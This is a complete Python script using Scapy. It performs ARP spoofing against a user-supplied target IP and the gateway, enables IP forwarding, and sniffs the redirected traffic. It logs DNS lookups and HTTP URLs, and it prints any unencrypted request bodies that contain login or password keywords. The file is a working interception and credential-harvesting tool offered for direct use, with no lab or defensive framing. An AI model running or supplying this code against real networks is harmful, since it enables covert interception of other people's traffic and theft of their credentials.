import scapy.all as scapy
from scapy.layers import http
import time
import os
import threading
import urllib.parse

# --- CONFIGURATION ---
def get_interface():
    # Automatically detects the active network interface
    return scapy.conf.iface

def get_gateway_ip():
    # Automatically retrieves the default gateway (router) IP
    try:
        return scapy.conf.route.route("0.0.0.0")[2]
    except:
        return scapy.conf.route.route("0.0.0.0")

# --- ATTACK FUNCTIONS (ARP SPOOFING) ---
def spoof(target_ip, spoof_ip):
    target_mac = scapy.getmacbyip(target_ip)
    if not target_mac:
        return False
    # Create Ethernet layer to avoid Scapy warnings and ensure delivery
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.sendp(packet, verbose=False)
    return True

def restore(destination_ip, source_ip):
    # Restores the original ARP tables of the devices
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)
    if destination_mac and source_mac:
        packet = scapy.Ether(dst=destination_mac) / scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.sendp(packet, count=4, verbose=False)

# --- ANALYSIS FUNCTIONS (SNIFFING & LOGGING) ---
def process_packet(packet):
    # 1. DNS LOGGING: Capture requested domain names
    if packet.haslayer(scapy.DNSQR):
        query = packet[scapy.DNSQR].qname.decode()
        print(f"[DNS] Target requested domain: {query}")

    # 2. HTTP SNIFFING: Capture URLs and data on unencrypted sites
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        print(f"[HTTP URL] Visited >> {url}")

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors='ignore')
            # Decode URL-encoding (e.g., %40 becomes @)
            decoded_load = urllib.parse.unquote(load)
            
            keywords = ["user", "login", "password", "pass", "pwd", "email"]
            if any(key in decoded_load.lower() for key in keywords):
                print(f"\n{'!'*40}\n[POSSIBLE CREDENTIALS FOUND]: {decoded_load}\n{'!'*40}\n")

def start_sniffing(interface):
    # Sniff all traffic passing through the interface
    scapy.sniff(iface=interface, store=False, prn=process_packet)

# --- MAIN PROGRAM ---
try:
    # Enable IP Forwarding in the Linux kernel
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    interface = get_interface()
    gateway_ip = get_gateway_ip()
    
    print(f"[*] Interface detected: {interface}")
    print(f"[*] Gateway detected:   {gateway_ip}")
    
    target_ip = input("Enter Target IP: ")

    # Start the sniffer in a separate thread
    sniff_thread = threading.Thread(target=start_sniffing, args=(interface,))
    sniff_thread.daemon = True
    sniff_thread.start()

    print(f"[*] Attack started on {target_ip}... (Press Ctrl+C to stop)")

    while True:
        # Keep poisoning the target and the gateway
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[*] Stopping attack and restoring network...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    # Disable IP Forwarding
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] Network restored. Exiting.")
